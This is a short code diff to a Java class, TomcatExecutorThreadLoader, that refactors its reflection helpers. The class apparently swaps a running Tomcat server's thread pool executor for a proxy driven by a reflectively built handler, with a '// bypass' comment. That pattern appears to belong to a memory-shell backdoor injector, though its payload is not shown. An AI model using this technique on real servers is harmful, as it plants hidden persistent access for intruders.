@@ -50,11 +50,11 @@ public class TomcatExecutorThreadLoader {
             }
         }
 
-        Object var1 = invokeMethod(threadPoolExecutor.getClass(), threadPoolExecutor, "getCorePoolSize", new Class[]{}, new Object[]{});
-        Object var2 = invokeMethod(threadPoolExecutor.getClass(), threadPoolExecutor, "getMaximumPoolSize", new Class[]{}, new Object[]{});
-        Object var3 = invokeMethod(threadPoolExecutor.getClass(), threadPoolExecutor, "getKeepAliveTime", new Class[]{TimeUnit.class}, new Object[]{TimeUnit.MILLISECONDS});
+        Object var1 = invokeMethod(threadPoolExecutor, "getCorePoolSize", new Class[]{}, new Object[]{});
+        Object var2 = invokeMethod(threadPoolExecutor, "getMaximumPoolSize", new Class[]{}, new Object[]{});
+        Object var3 = invokeMethod(threadPoolExecutor, "getKeepAliveTime", new Class[]{TimeUnit.class}, new Object[]{TimeUnit.MILLISECONDS});
         Object var4 = TimeUnit.MILLISECONDS;
-        Object var5 = invokeMethod(threadPoolExecutor.getClass(), threadPoolExecutor, "getQueue", new Class[]{}, new Object[]{});
+        Object var5 = invokeMethod(threadPoolExecutor, "getQueue", new Class[]{}, new Object[]{});
 
         Class ThreadPoolExecutorClass = Class.forName("org.apache.tomcat.util.threads.ThreadPoolExecutor");
         Object executor = ThreadPoolExecutorClass.getConstructor(Integer.TYPE, Integer.TYPE, Long.TYPE, TimeUnit.class, BlockingQueue.class).newInstance(var1, var2, var3, var4, var5);
@@ -73,7 +73,7 @@ public class TomcatExecutorThreadLoader {
         constructor.setAccessible(true);
         Object javaObject = constructor.newInstance(executor);
 
-        Object resultObject = Proxy.newProxyInstance(TomcatExecutorThreadLoader.class.getClassLoader(), new Class[]{Executor.class},(InvocationHandler) javaObject);
+        Object resultObject = Proxy.newProxyInstance(TomcatExecutorThreadLoader.class.getClassLoader(), new Class[]{Executor.class}, (InvocationHandler) javaObject);
 
 //        invokeMethod(Class.forName("org.apache.tomcat.util.net.AbstractEndpoint"), nioEndpoint, "setExecutor", new Class[]{Executor.class}, new Object[]{resultObject});
         // bypass
@@ -129,6 +129,14 @@ public class TomcatExecutorThreadLoader {
                 field = getField(clazz.getSuperclass(), fieldName);
         }
         return field;
+    }
+
+    public static Object invokeMethod(Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
+        try {
+            return invokeMethod(obj.getClass(), obj, methodName, argsClass, args);
+        } catch (Exception e) {
+            return invokeMethod(obj.getClass().getSuperclass(), obj, methodName, argsClass, args);
+        }
     }
 
     public static Object invokeMethod(Class cls, Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
